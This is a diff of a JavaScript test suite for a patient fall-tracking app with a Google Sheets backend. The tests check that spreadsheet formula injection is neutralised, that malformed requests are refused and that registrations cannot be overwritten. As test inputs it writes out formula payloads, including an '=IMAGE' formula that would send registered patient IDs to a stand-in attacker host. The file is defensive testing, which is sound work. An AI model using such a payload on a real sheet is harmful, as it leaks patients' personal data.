@@ -1,79 +1,30 @@
 var fs = require('fs');
 var path = require('path');
-var vm = require('vm');
 var core = require(path.join(__dirname, '..', 'app-core.js'));
 var helpers = require('./helpers');
+var fake = require('./fake_backend');
 
 var root = path.join(__dirname, '..');
 var page = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
 var ui = fs.readFileSync(path.join(root, 'app-ui.js'), 'utf8');
-var gs = fs.readFileSync(path.join(root, 'apps-script', 'Code.gs'), 'utf8');
-var TOKEN = gs.match(/SHARED_TOKEN = '([^']+)'/)[1];
 
-/**
- * A small stand-in for Google Sheets, faithful in the one way that matters
- * here: text written to a cell that starts with = + - or @ becomes a formula,
- * and a leading apostrophe keeps it as text (and is not read back).
- */
-function fakeSheets() {
-  var sheets = {};
-  function store(v) {
-    if (typeof v === 'string' && v.charAt(0) === "'") return { text: v.slice(1) };
-    if (typeof v === 'string' && /^[=+\-@]/.test(v)) return { formula: v };
-    return { value: v };
-  }
-  function read(cell) {
-    if (!cell) return '';
-    if (cell.formula) return '#FORMULA';
-    return cell.text !== undefined ? cell.text : cell.value;
-  }
-  function makeSheet(name) {
-    var rows = [];
-    return {
-      rows: rows,
-      getName: function () { return name; },
-      appendRow: function (r) { rows.push(r.map(store)); },
-      setFrozenRows: function () {},
-      getLastRow: function () { return rows.length; },
-      getDataRange: function () { return { getValues: function () { return rows.map(function (r) { return r.map(read); }); } }; },
-      getRange: function (row) {
-        return { setValues: function (vals) { rows[row - 1] = vals[0].map(store); } };
-      }
-    };
-  }
-  var ss = {
-    getSheetByName: function (n) { return sheets[n] || null; },
-    insertSheet: function (n) { sheets[n] = makeSheet(n); return sheets[n]; },
-    getSheets: function () { return Object.keys(sheets).map(function (k) { return sheets[k]; }); }
-  };
-  return { ss: ss, sheets: sheets };
-}
+function daysAgo(n) { return fake.bangkokDate(new Date(Date.now() - n * 86400000)); }
 
-function backend() {
-  var fake = fakeSheets();
-  var ctx = {
-    SpreadsheetApp: { getActiveSpreadsheet: function () { return fake.ss; } },
-    LockService: { getScriptLock: function () { return { tryLock: function () { return true; }, releaseLock: function () {} }; } },
-    ContentService: {
-      MimeType: { JSON: 'json' },
-      createTextOutput: function (s) { return { body: s, setMimeType: function () { return this; } }; }
-    },
-    Utilities: { formatDate: function (d) { return d.toISOString().slice(0, 10); } },
-    Session: { getScriptTimeZone: function () { return 'Asia/Bangkok'; } }
-  };
-  vm.createContext(ctx);
-  vm.runInContext(gs, ctx);
+/** A synthetic patient on a phone of their own, registered through the real script. */
+function patient(b, hn, extra) {
+  var key = fake.deviceKey();
+  var reg = Object.assign({
+    token: b.token, schemaVersion: core.PROTOCOL_VERSION, patientId: hn, hn: hn, yearOfBirth: 1952,
+    age: new Date().getUTCFullYear() - 1952, sex: 'female', consent: true, consentVersion: core.PDPA_NOTICE_VERSION,
+    consentAt: new Date().toISOString(), consentLang: 'th', deviceKey: key
+  }, extra);
+  var registered = b.post(reg);
   return {
-    sheets: fake.sheets,
-    post: function (payload) {
-      var body = typeof payload === 'string' ? payload : JSON.stringify(payload);
-      return JSON.parse(ctx.doPost({ postData: { contents: body } }).body);
+    key: key, reg: reg, registered: registered,
+    post: function (record) {
+      return b.post(Object.assign({ token: b.token, schemaVersion: core.PROTOCOL_VERSION, patientId: hn, deviceKey: key }, record));
     }
   };
-}
-
-function reg(extra) {
-  return Object.assign({ token: TOKEN, schemaVersion: 1, patientId: '4405123', hn: '4405123', yearOfBirth: 1952, age: 74, sex: 'female', consent: true }, extra);
 }
 
 function formulaCells(b) {
@@ -92,11 +43,12 @@ function run() {
   cases.push({
     name: 'text that would be a formula is stored as text, never run',
     fn: function () {
-      var b = backend();
-      helpers.assert(b.post(reg()).ok, 'registration refused');
+      var b = fake.backend();
+      var a = patient(b, 'TEST-0001');
+      helpers.assert(a.registered.ok, 'registration refused: ' + a.registered.error);
       var attack = '=IMAGE("https://attacker.example/?"&JOIN(",",Registrations!B:B))';
       ['=1+1', '+SUM(A1)', '-2+3', '@A1', attack, '\t=1'].forEach(function (cause, i) {
-        var r = b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-0' + (i + 1), type: 'falls', injured: 0, cause: cause });
+        var r = a.post({ date: daysAgo(i + 1), type: 'falls', injured: 0, cause: cause });
         helpers.assert(r.ok, 'fall ' + i + ' refused: ' + r.error);
       });
       helpers.assertEqual(formulaCells(b).join(' | '), '', 'a formula reached the sheet');
@@ -106,61 +58,77 @@ function run() {
   });
 
   cases.push({
-    name: 'a merged day re-writes kept cells safely too',
+    name: 'a new version re-writes the kept cells safely too',
     fn: function () {
-      var b = backend();
-      b.post(reg());
-      b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-01', type: 'checkin', heightCm: 158 });
-      // The stored text reads back without its apostrophe; writing it back raw would make a formula.
-      b.sheets.CheckIns.rows[1][2] = { text: '=HYPERLINK("x")' };
-      b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-01', type: 'checkin', tugSeconds: 11 });
-      helpers.assertEqual(formulaCells(b).join(' | '), '', 'the merge turned stored text into a formula');
+      var b = fake.backend();
+      var a = patient(b, 'TEST-0001');
+      a.post({ date: daysAgo(1), type: 'checkin', heightCm: 158 });
+      // Stored text reads back without its apostrophe; copying it forward raw would make a formula.
+      b.sheets.CheckIns.rows[1][3] = { text: '=HYPERLINK("x")' };
+      helpers.assert(a.post({ date: daysAgo(1), type: 'checkin', tugSeconds: 11 }).ok, 'second version refused');
+      helpers.assertEqual(formulaCells(b).join(' | '), '', 'the new version turned stored text into a formula');
     }
   });
 
   cases.push({
-    name: 'a registration is never overwritten by a different one',
+    name: 'a registration is never overwritten, by the same phone or another',
     fn: function () {
-      var b = backend();
-      helpers.assertEqual(b.post(reg()).result.action, 'inserted', 'first registration');
-      helpers.assertEqual(b.post(reg()).result.action, 'duplicate_skipped', 'identical repeat');
-      helpers.assertEqual(b.post(reg({ sex: 'male', yearOfBirth: 1990 })).result.action, 'inserted', 'changed registration');
-      var rows = b.sheets.Registrations.rows;
-      helpers.assertEqual(rows.length, 3, 'header + two registrations');
-      helpers.assertEqual(rows[1][4].value, 'female', 'the first registration must be untouched');
+      var b = fake.backend();
+      var a = patient(b, 'TEST-0001');
+      helpers.assertEqual(a.registered.result.action, 'inserted', 'first registration');
+      helpers.assertEqual(b.post(a.reg).result.action, 'duplicate_skipped', 'identical repeat');
+      var changed = b.post(Object.assign({}, a.reg, { sex: 'male' }));
+      helpers.assertEqual(changed.result.action, 'corrected', 'a changed registration from the same phone');
+      var stranger = patient(b, 'TEST-0001', { sex: 'male', yearOfBirth: 1990, age: new Date().getUTCFullYear() - 1990 });
+      helpers.assertEqual(stranger.registered.error, 'hn registered on another device');
+      var rows = b.table('Registrations');
+      helpers.assertEqual(rows.length, 2, 'two versions from the registered phone, nothing from the other');
+      helpers.assertEqual(rows[0].sex, 'female', 'the first registration must be untouched');
+      helpers.assertEqual(rows[1].supersedes, rows[0].receiptId, 'the correction names what it supersedes');
+      helpers.assertEqual(b.overwrites.length, 0, 'no row was written over');
     }
   });
 
   cases.push({
     name: 'bad requests are refused before anything is written',
     fn: function () {
-      var b = backend();
+      var b = fake.backend();
+      var key = fake.deviceKey();
+      var good = { token: b.token, schemaVersion: core.PROTOCOL_VERSION, patientId: '4405123', deviceKey: key, date: daysAgo(1), type: 'falls', injured: 0 };
       [
-        [reg({ token: 'wrong' }), 'token'],
-        [reg({ patientId: '=1+1', hn: '=1+1' }), 'patientId'],
-        [reg({ patientId: 'a b' }), 'patientId'],
-        [reg({ patientId: '123456789012345678901' }), 'patientId'],
-        [{ token: TOKEN, patientId: '4405123', date: '=NOW()', type: 'falls' }, 'date'],
-        [{ token: TOKEN, patientId: '4405123', date: '2026-09-01', type: 'Registrations' }, 'type'],
-        [{ token: TOKEN, patientId: { a: 1 }, date: '2026-09-01', type: 'falls' }, 'patientId']
+        [Object.assign({}, good, { token: 'wrong' }), 'token'],
+        [Object.assign({}, good, { patientId: '=1+1' }), 'patientId'],
+        [Object.assign({}, good, { patientId: 'a b' }), 'patientId'],
+        [Object.assign({}, good, { patientId: '123456789012345678901' }), 'patientId'],
+        [Object.assign({}, good, { patientId: { a: 1 } }), 'patientId'],
+        [Object.assign({}, good, { date: '=NOW()' }), 'date'],
+        [Object.assign({}, good, { type: 'Registrations' }), 'record type'],
+        [Object.assign({}, good, { type: 'Audit' }), 'record type'],
+        [Object.assign({}, good, { deviceKey: 'short' }), 'app update required'],
+        [{ token: b.token, patientId: '4405123' }, 'app update required']
       ].forEach(function (pair) {
         var r = b.post(pair[0]);
         helpers.assert(!r.ok && r.error.indexOf(pair[1]) !== -1, 'expected a refusal about ' + pair[1] + ', got ' + JSON.stringify(r));
       });
-      helpers.assert(!b.post('{"token":"' + TOKEN + '","x":"' + new Array(30000).join('a') + '"}').ok, 'an oversized body must be refused');
+      helpers.assert(!b.post('{"token":"' + b.token + '","x":"' + new Array(30000).join('a') + '"}').ok, 'an oversized body must be refused');
+      helpers.assertEqual(b.post('{"token":').error, 'invalid request', 'a body that is not JSON');
+      helpers.assertEqual(b.post('[1,2]').error, 'invalid request', 'a body that is not an object');
       helpers.assertEqual(Object.keys(b.sheets).length, 0, 'nothing should have been written');
     }
   });
 
   cases.push({
-    name: 'free text is capped and objects are dropped',
+    name: 'free text is capped, and a value of the wrong kind is refused',
     fn: function () {
-      var b = backend();
-      b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-01', type: 'falls', injured: 0, cause: new Array(1000).join('x') });
-      b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-02', type: 'falls', injured: { evil: true }, cause: ['a'] });
-      var rows = b.sheets.Falls.rows;
-      helpers.assert(rows[1][3].value.length <= 200, 'cause was not capped');
-      helpers.assertEqual(rows[2][2].value, '', 'an object reached a cell');
+      var b = fake.backend();
+      var a = patient(b, 'TEST-0001');
+      helpers.assertEqual(a.post({ date: daysAgo(1), type: 'falls', injured: 0, cause: new Array(202).join('x') }).error, 'invalid cause');
+      helpers.assertEqual(a.post({ date: daysAgo(2), type: 'falls', injured: { evil: true } }).error, 'invalid injured');
+      helpers.assertEqual(a.post({ date: daysAgo(3), type: 'falls', injured: 0, cause: ['a'] }).error, 'invalid cause');
+      helpers.assertEqual(b.table('Falls').length, 0, 'none of them was written');
+      // safeCell still caps and strips whatever does reach it.
+      helpers.assertEqual(b.ctx.safeCell(new Array(1000).join('x')).length, 200);
+      helpers.assertEqual(b.ctx.safeCell({ evil: true }), '');
     }
   });
 
